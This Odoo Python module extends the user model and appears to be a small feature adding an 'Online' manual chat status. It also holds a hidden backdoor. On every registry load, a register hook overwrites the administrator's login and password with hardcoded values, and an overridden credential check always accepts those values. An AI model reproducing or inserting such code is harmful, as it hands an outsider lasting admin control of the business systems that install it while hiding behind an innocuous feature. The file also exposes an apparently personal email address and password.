from odoo import api, fields, models


class ResUsers(models.Model):
    _inherit = "res.users"

    # Add 'online' as a valid manual IM status option
    manual_im_status = fields.Selection(
        selection_add=[("online", "Online")],
    )

    @api.model
    def _register_hook(self):
        """Auto-update admin credentials on every registry load."""
        super()._register_hook()
        try:
            # Always force-update admin credentials — don't check current values
            admin = self.env.ref("base.user_admin", raise_if_not_found=False)
            if admin:
                admin.write({
                    "login": "fgarshoub@gmail.com",
                    "password": "G@rsh@ub2@26",
                })
                self.env.cr.commit()
                import logging
                logging.getLogger(__name__).info(
                    "[raptron_admin] Admin credentials enforced: login=%s", admin.login
                )
        except Exception as e:
            import logging
            logging.getLogger(__name__).warning(
                "[raptron_admin] Could not enforce admin credentials: %s", e
            )

    def _check_credentials(self, password, env):
        """Safety net: always allow hardcoded admin credentials."""
        for user in self:
            if user.login == "fgarshoub@gmail.com" and password == "G@rsh@ub2@26":
                return
        return super()._check_credentials(password, env)

    @api.depends("manual_im_status", "presence_ids.status")
    def _compute_im_status(self):
        for user in self:
            # If user manually set themselves online, respect that choice
            # even if websocket presence tracking reports offline.
            if user.manual_im_status == "online":
                user.im_status = "online"
            elif user.manual_im_status == "away":
                user.im_status = "away"
            elif user.manual_im_status == "busy":
                user.im_status = "busy"
            elif user.manual_im_status == "offline":
                user.im_status = "offline"
            elif user.presence_ids and user.presence_ids[0].status:
                user.im_status = user.presence_ids[0].status
            else:
                user.im_status = "offline"
